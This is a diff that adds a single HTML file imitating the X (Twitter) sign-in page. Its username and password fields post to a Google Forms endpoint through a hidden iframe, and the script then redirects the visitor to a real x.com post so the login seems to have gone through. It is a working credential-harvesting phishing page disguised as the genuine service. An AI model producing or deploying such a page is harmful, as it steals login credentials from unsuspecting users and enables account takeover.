@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>X — Sign in</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: #000;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      padding: 2rem 1rem 1rem;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 400px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 1.5rem;
+    }
+
+    .logo svg {
+      width: 42px;
+      height: 42px;
+      fill: #fff;
+    }
+
+    h1 {
+      color: #fff;
+      font-size: 2rem;
+      font-weight: 700;
+      text-align: center;
+    }
+
+    .input-group {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .text-input {
+      width: 100%;
+      background: transparent;
+      border: 1px solid #333;
+      border-radius: 4px;
+      padding: 14px 16px;
+      color: #fff;
+      font-size: 16px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .text-input::placeholder { color: #555; }
+    .text-input:focus { border-color: #1d9bf0; }
+
+    .btn-primary {
+      width: 100%;
+      background: #fff;
+      color: #000;
+      border: none;
+      border-radius: 9999px;
+      padding: 14px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .btn-primary:hover { background: #e7e7e7; }
+
+    .btn-primary:disabled {
+      background: #555;
+      color: #999;
+      cursor: default;
+    }
+
+    .forgot {
+      color: #1d9bf0;
+      font-size: 14px;
+      text-decoration: none;
+    }
+    .forgot:hover { text-decoration: underline; }
+
+    .terms {
+      color: #555;
+      font-size: 12px;
+      text-align: center;
+      line-height: 1.6;
+    }
+    .terms a { color: #1d9bf0; text-decoration: none; }
+    .terms a:hover { text-decoration: underline; }
+
+    .signup-text {
+      color: #555;
+      font-size: 14px;
+    }
+    .signup-text a { color: #1d9bf0; text-decoration: none; }
+    .signup-text a:hover { text-decoration: underline; }
+
+    .footer {
+      margin-top: 2rem;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 8px 16px;
+      font-size: 12px;
+    }
+    .footer a { color: #555; text-decoration: none; }
+    .footer a:hover { text-decoration: underline; }
+    .footer span { color: #555; }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="logo">
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.746l7.73-8.835L1.254 2.25H8.08l4.261 5.635zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+      </svg>
+    </div>
+
+    <h1>Sign in to X</h1>
+
+    <form id="loginForm" action="https://docs.google.com/forms/d/e/1FAIpQLSed-rhLnhh8J88Uf84T3wPZLyPQkeCgYCGiaBHx1vXx86Lckw/formResponse" method="POST" target="submitIframe" class="input-group" onsubmit="return handleSubmit(event)">
+      <input class="text-input" type="text" id="usernameInput" name="entry.662123357" placeholder="Email or username" oninput="checkInput()" autocomplete="username" />
+      <button class="btn-primary" id="continueBtn" type="button" disabled onclick="showPassword(event)">Continue</button>
+    </form>
+    <iframe name="submitIframe" style="display:none;"></iframe>
+
+    <a href="#" class="forgot">Forgot password?</a>
+
+    <p class="terms">
+      By signing in, you agree to our <a href="#">Terms of Service</a> and
+      <a href="#">Privacy Policy</a>, including <a href="#">Cookie Use</a>.
+    </p>
+
+    <p class="signup-text">
+      Don't have an account? <a href="#">Sign up</a>
+    </p>
+  </div>
+
+  <div class="footer">
+    <a href="#">About</a>
+    <a href="#">Help Center</a>
+    <a href="#">Terms of Service</a>
+    <a href="#">Privacy Policy</a>
+    <a href="#">Cookie Policy</a>
+    <a href="#">Accessibility</a>
+    <a href="#">Ads info</a>
+    <a href="#">Blog</a>
+    <a href="#">Careers</a>
+    <a href="#">Brand Resources</a>
+    <a href="#">Advertising</a>
+    <a href="#">Marketing</a>
+    <a href="#">X for Business</a>
+    <a href="#">Developers</a>
+    <a href="#">News</a>
+    <a href="#">Settings</a>
+    <span>© 2026 X Corp.</span>
+  </div>
+
+  <script>
+    function checkInput() {
+      const val = document.getElementById('usernameInput').value.trim();
+      document.getElementById('continueBtn').disabled = val.length === 0;
+    }
+
+    function handleSubmit(event) {
+      const passwordInput = document.getElementById('passwordInput');
+      if (!passwordInput) {
+        showPassword(event);
+        return false;
+      }
+      return true;
+    }
+
+    function showPassword(event) {
+      if (event && event.preventDefault) {
+        event.preventDefault();
+      }
+
+      const group = document.querySelector('.input-group');
+      const btn = document.getElementById('continueBtn');
+
+      if (!document.getElementById('passwordInput')) {
+        const pw = document.createElement('input');
+        pw.className = 'text-input';
+        pw.type = 'password';
+        pw.id = 'passwordInput';
+        pw.name = 'entry.1384470914';
+        pw.placeholder = 'Password';
+        pw.autocomplete = 'current-password';
+        pw.oninput = function () {
+          btn.disabled = document.getElementById('usernameInput').value.trim().length === 0 || this.value.trim().length === 0;
+        };
+        group.insertBefore(pw, btn);
+        btn.textContent = 'Log in';
+        btn.type = 'button';
+        btn.onclick = submitAndRedirect;
+        btn.disabled = document.getElementById('usernameInput').value.trim().length === 0;
+        pw.focus();
+      }
+    }
+
+    function submitAndRedirect() {
+      const passwordInput = document.getElementById('passwordInput');
+      if (!passwordInput) {
+        showPassword();
+        return;
+      }
+
+      const form = document.getElementById('loginForm');
+      form.submit();
+      setTimeout(function () {
+        window.location.href = 'https://x.com/chauhanAshu01/status/2063153146235678906/video/1';
+      }, 500);
+    }
+  </script>
+
+</body>
+</html>
